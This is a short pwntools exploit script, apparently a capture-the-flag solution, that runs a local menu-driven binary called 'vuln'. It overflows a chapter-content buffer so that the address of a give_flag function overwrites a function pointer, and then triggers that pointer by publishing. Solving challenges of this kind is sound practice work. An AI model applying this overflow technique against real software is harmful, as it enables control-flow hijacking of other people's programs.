from pwn import *

# Setup
context.binary = './vuln'
context.log_level = 'debug'

elf = ELF('./vuln')
p = process('./vuln')

# Resolve give_flag
give_flag = elf.symbols['give_flag']
log.info(f"give_flag @ {hex(give_flag)}")

# 1. Enter book title
p.sendlineafter(
    b"Please enter the title of the book you would like to write: ",
    b"CTF_BOOK"
)

# 2. Choose "Edit chapter"
p.sendlineafter(b"Choice: ", b"1")

# 3. Create chapter 1
p.sendlineafter(b"Enter chapter number: ", b"1")

# 4. Chapter name (safe)
p.sendlineafter(b"Enter chapter 1 name: ", b"chapter1")

# 5. Overflow chapter content → overwrite print_func
payload  = b"A" * 16          # fill content buffer
payload += p64(give_flag)     # overwrite function pointer

p.sendlineafter(b"Enter chapter 1 content: ", payload)

# 6. Publish book → triggers give_flag()
p.sendlineafter(b"Choice: ", b"3")

# Get flag
p.interactive()
